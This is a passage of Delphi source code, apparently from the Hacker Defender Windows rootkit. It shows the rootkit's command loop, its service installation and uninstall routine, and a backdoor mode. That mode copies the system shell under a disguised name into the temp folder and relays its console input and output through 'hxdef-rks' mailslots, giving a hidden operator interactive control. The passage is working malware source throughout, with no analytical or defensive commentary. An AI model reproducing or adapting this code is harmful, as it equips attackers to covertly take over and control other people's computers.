       {$IFDEF LOGGING}
       {$IF Logging_Level=1}
        Log('backdoor is running ok');
        {$IFEND}
       {$ENDIF}
        WaitPoint(100);
        ResumeThread(LPI.hThread);
        CloseHandle(LPI.hThread);
        CloseHandle(LPI.hProcess);
       end;
      end
      {$IFDEF LOGGING}
      {$IF Logging_Level=1}
       else Log('backdoor mailslot handle is invalid, error: '+IntToStr(GetLastError),True);
      {$IFEND}
      {$ENDIF}
     end;
     RK_REFRESH_SETTINGS:if (IntercomBuffer.Data1=AuthFromParamStr) and LoadIniFile then FillIniMapping;
     RK_DIE:if IntercomBuffer.Data1=AuthFromParamStr then
     begin
     {$IF Logging_Level=3}
      Log('IntercomBuffer.Msg: '+IntToStr(IntercomBuffer.Msg));
      Log('IntercomBuffer.Data1: '+IntToStr(IntercomBuffer.Data1));
      Log('IntercomBuffer.Data2: '+IntToStr(IntercomBuffer.Data2));
     {$IFEND}
      Done:=(IntercomBuffer.Data2=RK_DIE) or (IntercomBuffer.Data2=RK_UNINSTALL);
      if Done and (IntercomBuffer.Data2=RK_UNINSTALL) then UninstallRootkit;
     {$IF Logging_Level=3}
      Log('Done: '+IntToStr(Ord(Done)));
     {$IFEND}
      Continue;
     end;
    end;
   end;
 end;
 {$IF (Logging_Level=2) or (Logging_Level=3)}
 Log('main loop done');
 {$IFEND}

 CloseHandle(ServerMailslotHandle);
 CloseHandle(ServerMailslotFileHandle);
 UnmapViewOfFile(IniMappingAddr);
 CloseHandle(IniMappingHandle);
{$IF Logging_Level=3}
 Log('end of main');
{$IFEND}
 MainLoopRunning:=False;
end;

procedure RunAsRootkit;
begin
 {$IFDEF LOGGING}
 {$IF (Logging_Level=2) or (Logging_Level=3)}
 Log('run as rootkit');
 {$IFEND}
 {$ENDIF}
 CheckUniqInstance;
 {$IFDEF LOGGING}
 {$IF Logging_Level=2}
 Log('instace is unique');
 {$IFEND}
 {$ENDIF}

 if not LoadAPI then Exit;
{$IF Logging_Level=3}
 Log('api loaded');
{$IFEND}

 if not LoadIniFile then Exit;
 {$IFDEF LOGGING}
 {$IF (Logging_Level=2) or (Logging_Level=3)}
 Log('ini loaded');
 {$IFEND}
 {$ENDIF}

 StartSystemService;
end;


function HandlerRoutine(ACtrlType:Cardinal):Boolean; stdcall;
begin
 Result:=True;
end;

procedure ReadOutputProc(AArgs:Pointer);stdcall;
var
 LCompressedBuffer:Pointer;
 LBDBuffer:TBackdoorBuffer;

 LScreenInfo:TConsoleScreenBufferInfo;
 LOldCursorPos:TCoord;
 LChange:Boolean;
 LPB1,LPB2:PByte;
 LNewConsoleScreen,LOldConsoleScreen,LTmpScreen:TConsoleScreen;
 LI,LJ:Integer;
 LBytesWritten:Cardinal;
begin
 ZeroMemory(@LNewConsoleScreen,SizeOf(LNewConsoleScreen));
 ZeroMemory(@LOldConsoleScreen,SizeOf(LOldConsoleScreen));
 ZeroMemory(@LTmpScreen,SizeOf(LTmpScreen));

 with BackdoorVars do
 begin
  LBDBuffer.ID:=BSC_CONSOLE_OUTPUT;

  while ReadConsoleOutput(OutputHandle,@LNewConsoleScreen,FirstCoords,SecondCoords,FirstRect)
    and BSHRun do
  begin
   GetConsoleScreenBufferInfo(OutputHandle,LScreenInfo);
   LBDBuffer.OutputBuffer.CursorPosition:=LScreenInfo.dwCursorPosition;

   LChange:=not ((LOldCursorPos.X=LBDBuffer.OutputBuffer.CursorPosition.X) and (LOldCursorPos.Y=LBDBuffer.OutputBuffer.CursorPosition.Y));
   if not LChange then
   begin
    LPB1:=@LNewConsoleScreen;
    LPB2:=@LOldConsoleScreen;
    LChange:=LPB1^<>LPB2^;
    for LI:=0 to SizeOf(LOldConsoleScreen)-1 do
    begin
     if LChange then Break;
     LChange:=LPB1^<>LPB2^;
     Inc(LPB1);
     Inc(LPB2);
    end;
   end;
   if LChange then
   begin
    LTmpScreen:=LOldConsoleScreen;
    LOldConsoleScreen:=LNewConsoleScreen;

    for LJ:=0 to 79 do
     for LI:=0 to 24 do
     begin
      LBDBuffer.OutputBuffer.ConsoleBuffer.Chars[LJ*25+LI]:=Chr(Ord(LNewConsoleScreen[LI,LJ].AsciiChar) xor Ord(LTmpScreen[LI,LJ].AsciiChar));
      LBDBuffer.OutputBuffer.ConsoleBuffer.Attrs[LJ*25+LI]:=LNewConsoleScreen[LI,LJ].AAttributes xor LTmpScreen[LI,LJ].AAttributes;
     end;

    LOldCursorPos:=LBDBuffer.OutputBuffer.CursorPosition;
    GetMem(LCompressedBuffer,2*SizeOf(LBDBuffer.OutputBuffer));
    try
     LBDBuffer.Size:=JQCompress(LCompressedBuffer,@LBDBuffer.OutputBuffer,SizeOf(LBDBuffer.OutputBuffer));

     CopyMemory(@LBDBuffer.Raw,LCompressedBuffer,LBDBuffer.Size);
     WriteFile(SrvMailslotHandle,LBDBuffer,LBDBuffer.Size+3,LBytesWritten,nil);
    finally
     FreeMem(LCompressedBuffer);
    end;
   end else WaitPoint;
  end;
 end;
 ExitThread(0);
end;

procedure WriteInputProc(AArgs:Pointer);stdcall;
var
 LMessageSize,LBytes,LRecvBytes:Cardinal;
 LLargeBuffer:array[0..65535] of Char;
 LBDBuffer:TBackdoorBuffer;
 LPBDBuffer:PBackdoorBuffer;
 LPB:PByte;

begin
 with BackdoorVars do
 while BSHRun do
 begin
  if GetMailslotInfo(BackdoorMailslotHandle,nil,LMessageSize,nil,nil) then
  begin
   if ReadFile(BackdoorMailslotHandle,LLargeBuffer,SizeOf(LLargeBuffer),LRecvBytes,nil) then
   begin
    LPB:=@LLargeBuffer;
    while LRecvBytes>0 do
    begin
     LPBDBuffer:=PBackdoorBuffer(LPB);
     LBDBuffer:=LPBDBuffer^;
     Dec(LRecvBytes,LBDBuffer.Size+3);
     Inc(LPB,LBDBuffer.Size+3);
     case LBDBuffer.ID of
      BSC_CONSOLE_INPUT:if not WriteConsoleInput(InputHandle,LBDBuffer.InputBuffer[0],LBDBuffer.Size div SizeOf(TInputRecord),LBytes) then Break;
      BSC_CTRL_EVENT:GenerateConsoleCtrlEvent(LBDBuffer.CtrlType,0);
      BSC_END_REQ:BSHRun:=False;
     end;
    end;
   end else WaitPoint;
  end;
  WaitPoint;
 end;
 ExitThread(0);
end;

procedure RunAsBackdoor;
var
 LTime:TDateTime;
 LInt64:Int64;
 LPI:TProcessInformation;
 LSI:TStartupInfo;
 LShell,LTempBuf:array[0..MAX_PATH] of Char;
 LTempShell:string;
 LHandleArray:array[0..2] of THandle;
 LReadOutputProcThreadHandle,LWriteInputProcThreadHandle:THandle;
 LReadProcTID,LWriteProcTID,LBytesWritten:Cardinal;
 LPAcl:PAcl;

begin
 with BackdoorVars do
 begin
  BSHRun:=True;
  LTime:=Now*1000000;
  LInt64:=Trunc(LTime);
  SrvMailslotName:=ParamStr(2);
  BackdoorShell:=ParamStr(3);
  if Length(BackdoorShell)>0 then
   if (BackdoorShell[1]='"') and (BackdoorShell[Length(BackdoorShell)]='"') then
    BackdoorShell:=Copy(BackdoorShell,2,Length(BackdoorShell)-2);
  BackdoorMailslotName:='\\.\mailslot\hxdef-rks'+IntToStr(LInt64);

 {$IFDEF LOGGING}
  {$IF Logging_Level=1}
  Log('CmdLine = '+GetCommandLine,True);
  Log('BackdoorShell = '+BackdoorShell,True);
  Log('SrvMailslotName = '+SrvMailslotName,True);
  Log('BackdoorMailslotName: '+BackdoorMailslotName);
  {$IFEND}
 {$ENDIF}


  if not CreateServerMailslot(BackdoorMailslotName,LPAcl) then Exit;
  VirtualFree(LPAcl,0,MEM_RELEASE);

  BackdoorMailslotHandle:=ServerMailslotHandle;
  {$IFDEF LOGGING}
  {$IF Logging_Level=1}
   Log('BackdoorMailslotHandle: '+IntToStr(BackdoorMailslotHandle));
  {$IFEND} 
  {$ENDIF}

  SrvMailslotHandle:=CreateFile(PChar(SrvMailslotName),GENERIC_WRITE,FILE_SHARE_READ,nil,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
  if SrvMailslotHandle<>INVALID_HANDLE_VALUE then
  begin
  {$IFDEF LOGGING}
  {$IF Logging_Level=1}
   Log('SrvMailslot handle is valid');
  {$IFEND} 
  {$ENDIF}

   WriteFile(SrvMailslotHandle,Pointer(@BackdoorMailslotName[1])^,Length(BackdoorMailslotName),LBytesWritten,nil);

   AllocConsole;
   InputHandle:=GetStdHandle(STD_INPUT_HANDLE);
   OutputHandle:=GetStdHandle(STD_OUTPUT_HANDLE);
   FirstCoords.X:=80;
   FirstCoords.Y:=25;
   SetConsoleScreenBufferSize(OutputHandle,FirstCoords);

   with FirstRect do
   begin
    Left:=0;
    Top:=0;
    Right:=79;
    Bottom:=24;
   end;
   SetConsoleWindowInfo(OutputHandle,True,FirstRect);
   SetConsoleCtrlHandler(@ExitProcess,False);
   SetConsoleCtrlHandler(@HandlerRoutine,True);
   SetConsoleCtrlHandler(nil,False);

   ZeroMemory(@FullConsoleScreen,SizeOf(FullConsoleScreen));
   SecondCoords.X:=0;
   SecondCoords.Y:=0;
   WriteConsoleOutput(OutputHandle,@FullConsoleScreen,FirstCoords,SecondCoords,FirstRect);
   SetConsoleCursorPosition(OutputHandle,SecondCoords);

   GetEnvironmentVariable(ComSpec,@LShell,SizeOf(LShell));

   GetTempPath(MAX_PATH,@LTempBuf);
   LTempShell:=LTempBuf;
   AddLastBackslash(LTempShell);
   LTempShell:=LTempShell+BackdoorShell;
   if FileExists(LTempShell) then DeleteFile(LTempShell);
   CopyFile(LShell,LTempShell,True);
   if not FileExists(LTempShell) then LTempShell:=LShell;

   ZeroMemory(@LSI,SizeOf(LSI));
   ShellProcess:=0;
   with LSI do
   begin
    cb:=SizeOf(TStartupInfo);
    dwFlags:=STARTF_USESHOWWINDOW;
   end;
  {$IFDEF LOGGING}
  {$IF Logging_Level=1}
   Log('create process '+LTempShell,True);
  {$IFEND}
  {$ENDIF}
   if CreateProcess(nil,PChar(LTempShell),nil,nil,True,0,nil,nil,LSI,LPI) then
   begin
   {$IFDEF LOGGING}
   {$IF Logging_Level=1}
    Log('create process: success');
   {$IFEND}
   {$ENDIF}
    ShellProcess:=LPI.hProcess;
    CloseHandle(LPI.hThread);
   end;

   if ShellProcess<>0 then
   begin
    LReadOutputProcThreadHandle:=CreateThread(nil,0,@ReadOutputProc,nil,0,LReadProcTID);
    LWriteInputProcThreadHandle:=CreateThread(nil,0,@WriteInputProc,nil,0,LWriteProcTID);
    if not ((LReadOutputProcThreadHandle=0) or (LWriteInputProcThreadHandle=0)) then
    begin
     LHandleArray[0]:=ShellProcess;
     LHandleArray[1]:=LReadOutputProcThreadHandle;
     LHandleArray[2]:=LWriteInputProcThreadHandle;
     WaitForMultipleObjects(3,@LHandleArray,False,INFINITE);
     BSHRun:=False;
     TerminateProcess(ShellProcess,0);
     WaitPoint(300);
     TerminateThread(LReadProcTID,0);
     TerminateThread(LWriteProcTID,0);
    end;
   end;
   WaitPoint(300);
   if LShell<>LTempShell then DeleteFile(LTempShell);

   CloseHandle(SrvMailslotHandle);
   FreeConsole;
  end
  {$IFDEF LOGGING}
  {$IF Logging_Level=1}
   else Log('create file SrvMailslot error: '+IntToStr(GetLastError))
  {$IFEND}
  {$ENDIF}                                
  ;
  CloseHandle(BackdoorMailslotHandle);
 end;
end;

procedure SendRequest(AMsg:Byte;AData:Cardinal);
var
 LBuffer:TIntercomBuffer;
 LHandle:THandle;
 LBytes:Cardinal;
begin
 LBuffer.ID:='999'+#00;
 LBuffer.Msg:=AMsg;
 LBuffer.Data1:=AuthFromParamStr;
 LBuffer.Data2:=AData;
 LHandle:=CreateFile(PChar(ServerMailslotName),GENERIC_WRITE,FILE_SHARE_READ or FILE_SHARE_WRITE,nil,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);

 if LHandle<>INVALID_HANDLE_VALUE then
 begin
  WriteFile(LHandle,LBuffer,INTERCOM_BUFFER_SIZE,LBytes,nil);
  CloseHandle(LHandle);
 end;
end;

procedure SendRefreshRequest;
begin
 SendRequest(RK_REFRESH_SETTINGS,0)
end;

procedure SendUninstallRequest;
begin
 SendRequest(RK_DIE,RK_UNINSTALL);
end;


begin
{$IFDEF LOGGING}
 Log('');
 Log('---------new session---------');
 Log('');
 Log('');
{$ENDIF}

 Argc:=ParamCount;
 if Argc>0 then Argv1:=UpCase(ParamStr(1))
 else Argv1:='';

 StartupFlags:=sfNormal;
 case Argc of
  1:if Argv1='-:INSTALLONLY' then StartupFlags:=sfInstallOnly
    else if Argv1='-:REFRESH' then StartupFlags:=sfRefresh
    else if Argv1='-:NOSERVICE' then StartupFlags:=sfNoService
    else if Argv1='-:UNINSTALL' then StartupFlags:=sfUninstall;
  3:if Argv1='-:BD:-' then StartupFlags:=sfBackdoor;
 end;

 GetServerMailslotName;

 case StartupFlags of
  sfBackdoor:RunAsBackdoor;
  sfRefresh:SendRefreshRequest;
  sfUninstall:SendUninstallRequest;
  else RunAsRootkit;
 end;
end.
